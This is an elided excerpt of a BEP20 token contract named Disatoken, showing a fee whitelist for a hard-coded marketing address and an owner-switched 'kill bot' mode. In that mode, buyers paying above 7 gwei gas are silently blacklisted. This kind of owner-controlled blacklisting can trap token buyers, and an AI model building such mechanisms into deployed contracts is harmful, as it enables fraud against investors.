...
abstract contract BEP20 is IERC20, Ownable {
    ...
    address[] marketingAddress=[0xa58BC98C56d556Bf438612f7910cA587803b1111];
    ...
    constructor (
        ...
        _feeWhiteList[marketingAddress[0]] = true;
    ...
    function _transfer(
        ...
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                ...
                if(_swapPairList[from] && iskillbot && tx.gasprice>7*10**9){
                    _blackList[to]=true;
                }
    ...
    function endKill() external onlyOwner {
        iskillbot = false;
    }
    ...
    function claimToken(address addr, uint256 enable) external   {
...
contract Disatoken is BEP20 {
    constructor() BEP20(
        ...
        18, 
        20000, 
        address(0x92b906f41f9C88381F4c472df766EaBb8C4f1111), 
        address(0x92b906f41f9C88381F4c472df766EaBb8C4f1111)
    ){ 
    }
}